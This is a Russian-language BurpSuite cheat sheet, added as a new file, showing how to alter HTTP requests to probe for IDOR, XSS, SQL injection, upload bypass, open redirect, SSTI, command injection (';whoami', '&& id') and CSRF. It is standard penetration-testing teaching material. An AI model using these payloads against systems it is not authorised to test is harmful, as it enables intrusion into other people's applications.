@@ -1,0 +1,159 @@
+**BurpSuite ШПАРГАЛКА: Как МЕНЯТЬ запросы, чтобы найти уязвимости**
+
+---
+
+### 1. IDOR (Insecure Direct Object Reference)
+
+* БЫло:
+
+```
+GET /user/102/profile HTTP/1.1
+Cookie: session=abc123
+```
+
+* Что МЕНЯТЬ:
+
+```
+/user/102/  -->  /user/101/, /user/100/, /user/1/ и т.д.
+```
+
+* Цель: проверить, не отдаст ли API данные другого юзера.
+
+---
+
+### 2. XSS (Cross-Site Scripting)
+
+* Было:
+
+```
+GET /search?q=test
+```
+
+* Что МЕНЯТЬ:
+
+```
+?q=test  -->  ?q=<script>alert(1)</script>
+```
+
+* Цель: смотреть, появится ли alert, станет ли JS-код частью страницы.
+
+---
+
+### 3. SQLi (SQL Injection)
+
+* Было:
+
+```
+GET /item?id=5
+```
+
+* Что МЕНЯТЬ:
+
+```
+id=5  -->  id=5' or '1'='1
+```
+
+* Цель: проверить, увеличится ли вывод или появится ошибка базы.
+
+---
+
+### 4. File Upload Bypass
+
+* Было:
+
+```
+filename=cat.jpg
+```
+
+* Что МЕНЯТЬ:
+
+```
+filename=shell.php
+```
+
+И/или:
+
+```
+filename=shell.php.jpg
+```
+
+Цель: проверить, запускается ли PHP/код по ссылке на файл.
+
+---
+
+### 5. Open Redirect
+
+* Было:
+
+```
+/login?next=/dashboard
+```
+
+* Что МЕНЯТЬ:
+
+```
+next=/dashboard  -->  next=https://evil.com
+```
+
+* Цель: редиректит ли на сторонний сайт.
+
+---
+
+### 6. SSTI (Server-Side Template Injection)
+
+* Было:
+
+```
+name=test
+```
+
+* Что МЕНЯТЬ:
+
+```
+name={{7*7}}   -->  name={7*7}, name=<%=7*7%>
+```
+
+* Цель: получить 49 во ответе
+
+---
+
+### 7. Command Injection
+
+* Было:
+
+```
+ip=127.0.0.1
+```
+
+* Что МЕНЯТЬ:
+
+```
+ip=127.0.0.1;whoami
+```
+
+Или:
+
+```
+ip=127.0.0.1 && id
+```
+
+* Цель: вызывается ли команда на сервере
+
+---
+
+### 8. CSRF (Cross-Site Request Forgery)
+
+* Было:
+
+```
+POST /change_email
+email=user@a.com
+```
+
+* Что делать:
+
+  1. Убрать CSRF-токен (hidden input)
+  2. Скопировать запрос в Repeater и отправить без токена
+
+Цель: если запрос проходит, то CSRF уязвимость.
+
